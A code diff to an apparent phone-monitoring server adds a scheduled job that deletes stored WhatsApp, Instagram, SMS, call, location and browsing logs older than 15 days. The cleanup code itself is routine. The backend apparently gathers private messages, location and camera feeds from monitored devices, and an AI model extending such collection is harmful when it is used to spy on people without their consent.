@@ -313,6 +313,35 @@ const pool = require("./db/pool");
   }
 })();
 
+// Auto Storage Cleanup: Purge logs & chat data older than 15 days to keep DB fast and prevent overload
+async function runAutoStorageCleanup() {
+  try {
+    const tablesToPrune = [
+      { table: "whatsapp_messages", col: "message_time" },
+      { table: "instagram_messages", col: "message_time" },
+      { table: "location_logs", col: "logged_at" },
+      { table: "app_usage_logs", col: "start_time" },
+      { table: "web_history_logs", col: "visited_at" },
+      { table: "call_logs", col: "call_time" },
+      { table: "sms_logs", col: "sms_time" },
+      { table: "alerts", col: "created_at" }
+    ];
+    for (const { table, col } of tablesToPrune) {
+      try {
+        const res = await pool.query(`DELETE FROM ${table} WHERE ${col} < NOW() - INTERVAL '15 days'`);
+        if (res.rowCount > 0) {
+          console.log(`[AutoStorageCleanup] Cleaned up ${res.rowCount} rows older than 15 days from ${table}`);
+        }
+      } catch (_e) {}
+    }
+  } catch (err) {
+    console.warn("[AutoStorageCleanup] Error running scheduled 15-day cleanup:", err.message);
+  }
+}
+
 server.listen(PORT, () => {
+  // Run initial cleanup on startup and every 6 hours
+  runAutoStorageCleanup();
+  setInterval(runAutoStorageCleanup, 6 * 60 * 60 * 1000);
   console.log(`spapp-monitoring-backend listening on port ${PORT} (HTTP + WS file + screen + camera relay)`);
 });
